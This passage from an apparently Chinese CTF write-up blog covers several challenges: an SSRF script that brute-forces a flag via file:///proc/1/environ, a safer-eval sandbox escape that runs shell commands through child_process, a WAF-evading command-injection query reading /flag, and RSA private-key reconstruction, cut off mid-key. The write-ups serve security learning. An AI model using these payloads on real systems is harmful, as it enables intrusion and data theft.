class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload_sum=string.ascii_lowercase+string.digits+<span class="string">&#x27;&#123;&#125;-&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload_sum)</span><br><span class="line">target=<span class="string">&#x27;http://node4.anna.nssctf.cn:28374/&#x27;</span></span><br><span class="line">payload_data=<span class="string">&quot;NSSCTF&#123;&quot;</span></span><br><span class="line">payload_url=<span class="string">&quot;File:///proc/1/environ&quot;</span></span><br><span class="line">target_get_data=target+<span class="string">&#x27;get_data&#x27;</span></span><br><span class="line">target_get_flag=target+<span class="string">&#x27;get_hindd_result&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payload_sum:</span><br><span class="line">        temp=payload_data+j</span><br><span class="line">        <span class="comment">#print(j)</span></span><br><span class="line">        session = requests.session()</span><br><span class="line">        session.post(target_get_data,data=&#123;<span class="string">&#x27;data&#x27;</span>:temp,<span class="string">&#x27;url&#x27;</span>:payload_url,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;%E6%8F%90%E4%BA%A4&#x27;</span>&#125;)</span><br><span class="line">        response=session.get(target_get_flag,cookies=&#123;<span class="string">&#x27;session&#x27;</span>:<span class="built_in">str</span>(session.cookies.values())[<span class="number">2</span>:-<span class="number">2</span>]&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(str(session.cookies.values())[2:-2])</span></span><br><span class="line">        <span class="comment">#print(response.text)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;you get it&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            payload_data+=j</span><br><span class="line">            <span class="built_in">print</span>(payload_data)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;bad!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>脚本编写能力还是太差了，写了半天。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;710ce1eb-8431-41e6-83fa-3213a14db9fc&#125;</span><br></pre></td></tr></table></figure><h2 id="GKCTF-2020-ez三剑客-easynode"><a href="#GKCTF-2020-ez三剑客-easynode" class="headerlink" title="[GKCTF 2020]ez三剑客-easynode"></a>[GKCTF 2020]ez三剑客-easynode</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105160042913.png" alt="image-20250105160042913" style="zoom:80%;" /><p>发现一个safer-eval 1.3.6版本，存在沙箱逃逸的漏洞。</p><p>下面看看源代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">&#x27;safer-eval&#x27;</span>); <span class="comment">// 2019.7/WORKER1 找到一个很棒的库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 老板说为了后期方便优化</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">path</span> === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="title function_">isInteger</span>(<span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>))) &#123;</span><br><span class="line">      delay = <span class="title class_">Math</span>.<span class="title function_">max</span>(delay, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">next</span>(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/eval&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">e</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = <span class="title function_">saferEval</span>(req.<span class="property">body</span>.<span class="property">e</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="title class_">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/version&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/json;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./package.json&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./index.html&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在&#x2F;eval路由下存在safeeval的rce，但是if (req.path &#x3D;&#x3D;&#x3D; ‘&#x2F;eval’) {，此处存在大时间的延迟，然而他是考setTimeout来进行的，可以通过</p><p>大于2147483647的数来绕过。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105160338220.png" alt="image-20250105160338220"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e=(function () &#123;</span><br><span class="line"></span><br><span class="line">const process = clearImmediate.constructor(&#x27;return process;&#x27;)();</span><br><span class="line"></span><br><span class="line">return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;).toString()&#125;)()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;970473a7-7ad6-4826-9a42-492ec0dcf96a&#125;</span><br></pre></td></tr></table></figure><h2 id="NSSRound-V-Team-PYRCE"><a href="#NSSRound-V-Team-PYRCE" class="headerlink" title="[NSSRound#V Team]PYRCE"></a>[NSSRound#V Team]PYRCE</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response </span><br><span class="line"><span class="keyword">import</span> uuid </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="comment"># flag in /flag </span></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>): </span><br><span class="line">black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span> </span><br><span class="line"><span class="keyword">for</span> black <span class="keyword">in</span> black_list: </span><br><span class="line"><span class="keyword">if</span> black <span class="keyword">in</span> rce: </span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line"><span class="keyword">if</span> request.args.get(<span class="string">&quot;Ňśś&quot;</span>): </span><br><span class="line">nss = request.args.get(<span class="string">&quot;Ňśś&quot;</span>) </span><br><span class="line"><span class="keyword">if</span> waf(nss): </span><br><span class="line">os.popen(nss) </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;waf&quot;</span> </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;/source&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>(): </span><br><span class="line">src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read() </span><br><span class="line"><span class="keyword">return</span> src </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>) </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ňśś=cp $(cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;echo $(pwd)flag) app.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ňśś=cp%09%24%28cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26echo%09%24%28pwd%29flag%29%09app.py</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow元旦渗透赛wp</title>
      <link href="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/"/>
      <url>/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h2 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h2><img src="https://ctfer-1257200238.cos.ap-shanghai.myqcloud.com/2025/01/picture/message1.jpg" alt="img" style="zoom:67%;" /><img src="https://ctfer-1257200238.cos.ap-shanghai.myqcloud.com/2025/01/picture/task1.jpg" alt="img" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交压缩包的密码</span><br></pre></td></tr></table></figure><p>首先获得的是一个压缩包，但是加密了。我们丢到passware里爆破一下。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072428317.png" class="" title="This is an example image"><p>直接出了，密码654321</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072458023.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交任务中心的网址</span><br></pre></td></tr></table></figure><p>获得一串base64编码后的数据，解码一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> secretMessageResponse</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="keyword">import</span> pip</span><br><span class="line">        pip.main([<span class="string">&#x27;install&#x27;</span>, <span class="string">&#x27;secretMessageResponse&#x27;</span>])</span><br><span class="line">        <span class="keyword">from</span> secretMessageResponse <span class="keyword">import</span> printMessage</span><br></pre></td></tr></table></figure><p>直接丢到python运行试试。返回结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">请使用组织分配的私钥解密后使用</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">2024-12-16</span><br><span class="line">gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM=</span><br><span class="line">----------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">请使用组织分配的私钥解密后使用</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">2024-04-11</span><br><span class="line">Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI=</span><br><span class="line">----------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">请使用组织分配的私钥解密后使用</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">2024-03-05</span><br><span class="line">ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA=</span><br><span class="line">----------------------------------------------------------</span><br></pre></td></tr></table></figure><p>同时题目给了npq</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span><br><span class="line">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span><br><span class="line">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span><br></pre></td></tr></table></figure><p>给了npq，e默认，那么私钥自然而然其实就有了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Cryptodome.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span></span><br><span class="line">p=<span class="number">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span></span><br><span class="line">q=<span class="number">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="comment"># print(d)</span></span><br><span class="line">d=<span class="built_in">int</span>(d)</span><br><span class="line">key = RSA.construct((n, e, d, p, q))</span><br><span class="line">private_key=key.export_key()</span><br><span class="line"><span class="built_in">print</span>(private_key.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIJKQIBAAKCAgEAmziayo9Tddo1FYdrtOswyjLYJ5frYKEwm4rQTsKU8UcdnnDR</span><br><span class="line">gms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZwBUqbgT5x+qUmUaVMll9FOT7ZJ05w</span><br><span class="line">8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63TDbXkJrv1fGl2rHpPwp5OPCUeCB3</span><br><span 